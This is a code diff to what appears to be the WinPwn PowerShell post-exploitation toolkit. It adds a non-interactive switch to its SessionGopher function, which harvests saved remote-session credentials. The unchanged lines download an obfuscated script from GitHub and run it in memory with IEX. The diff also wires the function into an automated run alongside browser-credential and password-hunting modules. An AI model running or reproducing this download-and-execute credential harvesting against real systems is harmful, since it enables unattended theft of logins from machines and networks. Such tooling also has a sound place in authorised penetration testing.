@@ -316,13 +316,19 @@ function sessionGopher
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
+     param(
+        [switch]
+        $noninteractive
+	)
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/segoph.ps1')
-    $whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'
+    $whole_domain = "no"
+    if (!$noninteractive){$whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'}
     if ($whole_domain -eq "yes" -or $whole_domain -eq "y" -or $whole_domain -eq "Yes" -or $whole_domain -eq "Y")
     {
-            $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a fuckin lot of time'
+            
+	        $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a fuckin lot of time'
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
                 Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
@@ -336,7 +342,11 @@ function sessionGopher
     }
     else
     {
-        $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a lot of time'
+        $session = "no"
+	    if(!$noninteractive)
+        {
+            $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a lot of time'
+        }
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
                 Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
@@ -1112,7 +1122,7 @@ __        ___       ____
         browserpwn
         dotnet
         passhunt -local $true -noninteractive
-        sessionGopher
+        sessionGopher -noninteractive
         sensitivefiles   
         return;
     }
